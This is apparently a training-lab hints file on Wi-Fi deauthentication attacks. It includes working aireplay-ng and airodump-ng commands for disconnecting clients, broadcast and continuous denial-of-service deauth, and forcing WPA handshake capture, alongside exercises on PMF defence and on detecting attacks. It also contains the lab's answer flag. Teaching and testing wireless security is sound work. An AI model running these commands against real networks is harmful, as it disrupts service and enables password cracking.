# Lab 06: Deauthentication Attacks - Hints

Progressive hints to help you complete the lab without giving away the full solution.

```
+===============================================================+
|                        HINT GUIDE                              |
+===============================================================+
|  Start with Hint Level 1. Only proceed if still stuck.        |
|  Challenge yourself - learning happens through struggle!       |
+===============================================================+
```

## Legal Reminder

```
+=====================================================================+
|                    CRITICAL LEGAL WARNING                            |
+=====================================================================+
|  Only perform deauthentication attacks on YOUR OWN networks in      |
|  ISOLATED environments. This attack disrupts service and is         |
|  ILLEGAL when performed on networks without full authorization.     |
+=====================================================================+
```

---

## Exercise 1: Basic Deauthentication

### Task
Disconnect your test client from your test network using a deauth attack.

### Hint Level 1 - Conceptual
Deauthentication frames tell a client that the AP wants them to disconnect. The client trusts this message without verification.

### Hint Level 2 - Tool
`aireplay-ng` is the tool for packet injection, including deauthentication attacks.

### Hint Level 3 - Information Needed
You need to know:
- The AP's BSSID (MAC address)
- The client's MAC address (for targeted attack)
- The channel the network operates on

### Hint Level 4 - Command Format
```bash
aireplay-ng -0 [COUNT] -a [AP_BSSID] -c [CLIENT_MAC] [INTERFACE]
```

### Hint Level 5 - Example
```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

---

## Finding Target Information

### "How do I find the AP's BSSID?"

**Hint Level 1:** You need to scan for wireless networks.

**Hint Level 2:** Use `airodump-ng` to discover networks.

**Hint Level 3:** The BSSID column shows AP MAC addresses.

### "How do I find the client's MAC?"

**Hint Level 1:** Clients connected to an AP are shown in the scan results.

**Hint Level 2:** Look at the bottom section of airodump-ng output.

**Hint Level 3:** The STATION column shows connected client MACs.

**Hint Level 4:** Match BSSID in station list to your target AP.

---

## Exercise 2: Handshake Capture with Deauth

### Task
Use deauthentication to force a WPA handshake capture.

### Hint Level 1 - Conceptual
When a client reconnects after being deauthenticated, the 4-way handshake occurs. Capture this handshake.

### Hint Level 2 - Two Tasks
You need two things running simultaneously:
1. Capture (to save the handshake)
2. Deauth (to force reconnection)

### Hint Level 3 - Terminal Setup
Use two terminal windows:
- Terminal 1: airodump-ng capturing
- Terminal 2: aireplay-ng sending deauth

### Hint Level 4 - Success Indicator
Watch the top-right of airodump-ng output for:
```
WPA handshake: [BSSID]
```

### Hint Level 5 - Commands
```bash
# Terminal 1 (capture)
sudo airodump-ng -c [CH] --bssid [AP] -w capture wlan0mon

# Terminal 2 (deauth)
sudo aireplay-ng -0 3 -a [AP] -c [CLIENT] wlan0mon
```

---

## Exercise 3: PMF Testing

### Task
Test deauthentication against a network with Protected Management Frames enabled.

### Hint Level 1 - What is PMF?
PMF (802.11w) adds authentication to management frames, including deauthentication frames.

### Hint Level 2 - Expected Behavior
With PMF enabled, your deauth attack should fail - the client should stay connected.

### Hint Level 3 - Enabling PMF
Check your router's wireless security settings for:
- "Protected Management Frames"
- "802.11w"
- "Management Frame Protection"

### Hint Level 4 - Testing
1. Enable PMF on router
2. Reconnect client
3. Attempt deauth attack
4. Client should remain connected

### Hint Level 5 - If PMF Not Supported
Not all routers support PMF. If yours doesn't, document this as a finding and understand that WPA3 makes it mandatory.

---

## Exercise 4: Detect Deauth Attacks

### Task
Use monitoring tools to detect deauthentication attacks.

### Hint Level 1 - Tools
Several tools can detect deauth floods:
- Kismet
- Wireshark
- Airodump-ng (indirectly)

### Hint Level 2 - Wireshark Filter
Filter for deauth frames:
```
wlan.fc.type_subtype == 0x0c
```

### Hint Level 3 - Kismet Detection
Kismet automatically alerts on deauth floods. Look for DEAUTHFLOOD alerts.

### Hint Level 4 - Signs of Attack
- High volume of management frames
- Many deauth frames in short period
- "Lost" count increases in airodump-ng
- Clients repeatedly disconnecting

---

## Troubleshooting Hints

### "Injection is not working"

**Hint 1:** Verify injection capability:
```bash
sudo aireplay-ng --test wlan0mon
```

**Hint 2:** Ensure monitor mode is properly enabled.

**Hint 3:** Some chipsets have limited injection support.

### "No ACKs received"

**Hint 1:** ACKs indicate the client received your frames.

**Hint 2:** 0 ACKs could mean:
- Client out of range
- Wrong MAC address
- PMF enabled

**Hint 3:** Broadcast deauth (no -c) always shows 0 ACKs.

### "Client reconnects immediately"

**Hint 1:** This is normal! Modern clients reconnect quickly.

**Hint 2:** For handshake capture, quick reconnection is good - you capture the handshake.

**Hint 3:** For DoS, use continuous deauth (-0 0), but only on your own network.

### "Attack doesn't work on some clients"

**Hint 1:** Check if PMF is enabled.

**Hint 2:** Verify you're on the correct channel.

**Hint 3:** Some newer devices have built-in protections.

**Hint 4:** WPA3 devices are inherently resistant.

---

## Quick Reference

```bash
# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Targeted deauth (specific client)
sudo aireplay-ng -0 5 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon

# Broadcast deauth (all clients)
sudo aireplay-ng -0 5 -a [AP_BSSID] wlan0mon

# Continuous deauth (DoS - own network only!)
sudo aireplay-ng -0 0 -a [AP_BSSID] wlan0mon

# Restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

## Understanding the Output

### aireplay-ng Deauth Output

```
Sending 64 directed DeAuth (code 7). STMAC: [CLIENT] [60|64 ACKs]
        ↑                    ↑           ↑        ↑
        │                    │           │        └── ACKs received
        │                    │           └── Target client MAC
        │                    └── Reason code 7
        └── 64 deauth frames per burst
```

### airodump-ng During Attack

```
BSSID              STATION            PWR   Rate    Lost    Frames
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -45   54e     125     567
                                              ↑
                                        Increases during attack
```

---

## Ethical Considerations

```
Before attacking, ask yourself:
─────────────────────────────────────────
✓ Is this MY network?
✓ Are there NO other users affected?
✓ Do I have WRITTEN authorization?
✓ Is this an ISOLATED environment?

If any answer is NO → Do NOT proceed!
```

---

## Still Stuck?

1. **Verify hardware:** Does your adapter support injection?
2. **Check monitor mode:** Is wlan0mon in Monitor mode?
3. **Verify target info:** Correct BSSID, channel, client MAC?
4. **Consult walkthrough:** walkthrough.md has complete solutions

---

**Flag Location:** Complete the exercises to earn: `FLAG{d34uth_4tt4ck}`
